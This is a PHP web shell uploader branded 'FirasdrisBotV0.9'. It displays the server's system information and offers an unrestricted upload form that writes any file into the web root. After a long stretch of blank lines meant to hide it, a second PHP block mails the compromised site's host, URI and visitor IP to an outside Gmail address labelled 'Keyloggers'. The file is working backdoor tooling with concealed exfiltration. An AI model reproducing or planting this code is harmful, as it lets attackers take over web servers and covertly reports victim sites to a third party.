<html>

    <head>
        <title>Uploader By Firas Dris</title>
	</head>
<body>
<br>
<br>
<br>
<br>
<br>
<br>
<br><br>
<body onload="window.focus();init();" onunload="halt();">
<body onLoad="writetext()" style="background:black;">
	<embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
	<table heigh="" width="800" border="20" align="center">
    <tbody><tr>
    <td valign="top" background=""><p id="MiSi" style="margin-left: 3px;">
<?php
$om= "Firasdris";
$ar= "BotV0.9";
$atx = $om.$ar;
echo $atx;
echo "<font color='RED'</font><center><h1>$atx</h1></center>";
echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
if( $_POST['_upl'] == "Upload" ) { 
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
} 
?>
</html>
	    
	    
	    
	    
	    

	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
	    
 <?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = "✪ Keyloggers -$ip";
$email = "user54487215@gmail.com";
$from = "From: Firas Dris BotV0.9 <noreply@firasdrishells.com>";
$a45 = $_SERVER['HTTP_HOST'];
$b75 = $_SERVER['REQUEST_URI'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
	    
